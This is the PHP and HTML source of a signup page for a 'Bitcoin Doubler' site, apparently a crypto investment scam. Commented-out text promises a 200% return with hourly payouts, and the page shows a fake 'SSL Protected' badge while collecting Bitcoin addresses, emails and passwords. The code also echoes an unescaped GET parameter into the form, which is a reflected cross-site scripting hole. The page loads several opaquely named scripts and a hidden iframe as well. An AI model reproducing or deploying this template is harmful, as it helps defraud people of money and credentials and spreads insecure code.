<?php

session_start();

setlocale(LC_ALL,"es_ES");
date_default_timezone_set('America/Los_Angeles');

if(isset($_SESSION["log"])){
	
	header("location: ./dashboard");
	
}else{

?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./files/saved_resource" async="" type="text/javascript"></script><script type="text/javascript" async="" charset="utf-8" src="./files/bundle.js.descarga"></script><script type="text/javascript" charset="utf-8" async="" src="./files/loader.js.descarga"></script><script charset="UTF-8" src="./files/4f88bcb3f0e4731032db1e65a9e9408f_1.js.descarga" async=""></script> 


   
      
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      <meta name="description" content="">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
      <!-- PAGE TITLE --> 
      <title>[SECURED] Bitcoin Doubler</title>
      <!-- GOOGLE FONTS --> 
	  <link rel="shortcut icon" href="./files/btcico.png">
      <link href="./files/css" rel="stylesheet" type="text/css">
      <link rel="stylesheet" href="./files/style.css">
   <script type="text/javascript" async="" src="./files/js15_as.js.descarga"></script></head>
   <body class="trd-home-template trd-homepage-five">
	   
	   
      <!-- HEADER --> 
      <header class="trd-header trd-fixed-header">
         <!-- Topbar --> 
         <div class="trd-header-topbar">
            <div class="container">
               <div class="row">
                  <!-- contact info --> 
                  <div class="trd-contact-infos">
                     <ul>
						<?php
						
							include "./precio.php";
						
						?>
                        <li><img src="./files/loca.png"> 78 Canterbury Rd, Sunderland, United Kingdom</li>
                        <li class="trd-header">1.0 BTC = <?php echo $price; ?> USD</li><section class="trd-false-div" style="height: 100px; display: none;"></section>
                     </ul>
                  </div>
                  <!-- End --> <!-- Social Links --> 
                  <div class="trd-social-links">
                     <!-- <ul> <li class="trd-fb-icon"> <a href="#"> <i class="fa fa-facebook"></i> </a> </li> <li class="trd-twitter-icon"> <a href="#"> <i class="fa fa-twitter"></i> </a> </li> <li class="trd-behance-icon"> <a href="#"> <i class="fa fa-behance"></i> </a> </li> <li class="trd-dribbble-icon"> <a href="#"> <i class="fa fa-dribbble"></i> </a> </li> <li class="trd-vimeo-icon"> <a href="#"> <i class="fa fa-vimeo"></i> </a> </li> </ul>--> 
                  </div>
                  <!-- End --> 
               </div>
            </div>
         </div>
         <!-- End --> <!-- Bottombar --> 
         <div class="trd-header-bottombar">
            <!-- Navigation Menu start--> 
            <nav class="navbar trd-main-menu" role="navigation">
               <div class="container">
                  <div class="row">
                     <!-- Navbar Toggle --> 
                     <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse"> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button> <!-- Logo --> <a class="navbar-brand" href="./"><img src="./files/logo.png" height="40"></a> 
                     </div>
                     <!-- Navbar Toggle End --> <!-- navbar-collapse start--> 
                     <div id="nav-menu" class="navbar-collapse trd-menu-wrapper collapse" role="navigation" style="max-height: 8852px;">
                        <!-- Menu --> 
                        <ul class="nav navbar-nav trd-menus">
                           
                           <li class="active"> <a href="./signup">Signup</a> </li> 
						   <li> <a href="./login">Login</a> </li>
						   <li> <a href="./">Home</a> </li>
						   
                        </ul>
                        <!-- End --> 
                     </div>
                     <!-- navbar-collapse end--> 
                  </div>
               </div>
            </nav>
            <!-- Navigation Menu end--> 
         </div>
         <!-- End --> 
      </header><section class="trd-false-div" style="height: 100px; display: none;"></section>
      <!-- HEADER END --> <!-- <section class="trd-hero-slider-section"> <div class="slider-pro trd-hero-slider" id="trd-hero-slider"> <div class="sp-slides"> <div class="sp-slide trd-main-slides"> <img class="sp-image" src="images/slider-img-1.jpg" alt="Slider Image"/> <div class="sp-layer trd-slider-img trd-mac-img" data-position="bottomCenter" data-vertical="-25" data-horizontal="125" data-show-delay="500" data-hide-delay="200" data-show-transition="left" data-hide-transition="right"> <img src="images/shape.png" alt="Triangle Shape"> </div> <h1 class="sp-layer trd-slider-text-big" data-position="center" data-vertical="-130" data-horizontal="150" data-show-transition="left" data-hide-transition="up" data-show-delay="1000" data-hide-delay="200"> Most <span class="trd-highlight-text">Trusted</span><br> Bitcoin doubler </h1> <p class="sp-layer trd-slider-text-small" data-position="center" data-vertical="90" data-horizontal="315" data-show-delay="1500" data-hide-delay="200" data-show-transition="down" data-hide-transition="down"> EVERY HOUR PAYOUTS<br> AUTOMATED PAYOUT<br> SECURE SYSTEM<br> 200% INVESTMENT RETURN </p> <div class="sp-layer trd-hero-header-btns" data-position="center" data-vertical="260" data-horizontal="-45" data-show-delay="2000" data-hide-delay="200" data-show-transition="down" data-hide-transition="up"> <a href="invest.php" class="trd-btn">Invest now</a> </div> </div> </div> </div> </section> --> <!-- CTA SECTION --> <!-- CTA SECTION END --> <!-- SERVICE SECTION --><br><br><br><br><br> 
      <!-- SERVICE SECTION END --> 
      <!-- CUSTOM SECTION -->
        
		
		
		
		
		
		
		
		 <section class="trd-custom-section trd-section">
            <div class="container">
	            
	                <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12 trd-icon-top-boxed">
                        <div class=" trd-icon-top-with-text">
	                        <p>Registration</p>
							<?php
								if(isset($_GET["error"]) && $_GET["error"] == "password"){
								
									echo '<p style="color: red">Passwords not match</p>';
									
								}
							?>
							<?php
								if(isset($_GET["error"]) && $_GET["error"] == "email"){
								
									echo '<p style="color: red">Email already exists in our data base</p>';
									
								}
							?>
                            <div class="trd-details">
Your Bitcoin Address for payouts:<br>
<form action="./NewUser" method="POST" accept-charset="utf-8">
<input type="text" name="address" required="" placeholder="Your bitcoin address" style="font-size: large; width: 300px; height: 30px" <?php if(isset($_GET["address"])){echo "value='".$_GET["address"]."'"; } ?> pattern="[A-Za-z-0-9]{25,34}"><br>
Enter your e-mail:<br>
<input type="email" name="email" required="" placeholder="E-Mail" style="font-size: large; width: 300px; height: 30px"><br>
Enter new password:<br>
<input type="password" name="password1" required="" placeholder="Password" style="font-size: large; width: 300px; height: 30px"><br>
Repeat new password:<br>
<input type="password" name="password2" required="" placeholder="Repeat password" style="font-size: large; width: 300px; height: 30px"><br><br>
<input type="submit" value="Sign Up now" class="trd-btn trd-btn-alt">
<input type="button" value="Back" class="trd-btn trd-btn-alt" onclick="javascript:location='./invest'">
<br>&nbsp;<br>
<h4>
<img src="./files/ssl.jpg" style="width: 80px; height: 80px">
&nbsp;
SSL Protected
</h4>
</form>
                                
                            </div>


                        </div>
                    </div>


                </div>
            </div>
        </section>
		
		
		
		
		
		
		
		
		
		
      
      <footer>
         <div class="container">
         <div class="row">
            <!-- Footer Top --> 
            <div class="trd-footer-top">
               <!-- Footer Bottom --> 
               <div class="trd-footer-bottom">
                  <div class="trd-footer-menu">
                     <ul>
                        <li> <a href="./">Home</a> </li>
                        <li> <a href="./invest">Invest</a> </li>
                        <li> <a href="./support">Support</a> </li>
                        <li> <a href="./rules">Disclaimer</a> </li> 
						<li> <a href="./login">Login</a> </li><li> <a href="./signup">Signup</a> </li>
                     </ul>
                  </div>
                  <div class="trd-copyright-info">
                     <p>Copyright © 2017 by <a href="./#" class="trd-author-link">BitcoinDoubler</a></p>
                  </div>
               </div>
               <!-- End --> 
            </div>
         </div>
         <!-- End --> 
      </div></footer>
   
 
    
 <!-- FOOTER END --> <!-- jQuery --> <script src="./files/jquery.min.js.descarga"></script> <!-- Plugins --> <script src="./files/plugins.js.descarga"></script>  <script src="./files/main.js.descarga"></script><script>$(document).ready(function(){setInterval(function(){$('.countdown').each(function(){var time=$(this).text().split(':');var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;var hours=Math.floor(timestamp/3600);var minutes=Math.floor((timestamp- hours*3600)/ 60);var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}if(minutes<10){minutes='0'+ minutes;}if(seconds<10){seconds='0'+ seconds;}$(this).text(hours+':'+ minutes+':'+ seconds);});},1000);})</script> <!-- Main scripts build from webpack --> <!-- <script src="js/scripts.js"></script> --> <!-- Histats.com START (aync)--><script type="text/javascript">var _Hasync= _Hasync|| [];_Hasync.push(['Histats.start', '1,3855688,4,0,0,0,00000000']);_Hasync.push(['Histats.fasi', '1']);_Hasync.push(['Histats.track_hits', '']);(function() {var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;hs.src = ('//s10.histats.com/js15_as.js');(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);})();</script>
      <noscript>&lt;a href="/" target="_blank"&gt;&lt;img src="//sstatic1.histats.com/0.gif?3902820&amp;101" alt="" border="0"&gt;&lt;/a&gt;</noscript>
      <!-- Histats.com END -->
  <link rel="stylesheet" href="./files/jquery-ui.css">
  <script src="./files/jquery-ui.js.descarga"></script>

<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/5a177633198bd56b8c03d03c/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
   

<script async="" type="text/javascript" src="./files/0.php"></script><script src="./files/ZQp6LCe0OO3LeZB6ES1CZrJvMefQTtT9oZjddBS5" async=""></script><iframe id="AYAH_iframe1511460086608" src="./files/kitten.html" width="0" height="0" scrolling="no" frameborder="0" style="border: none; overflow: hidden; display: none;"></iframe></body></html>
<?php
} 
?>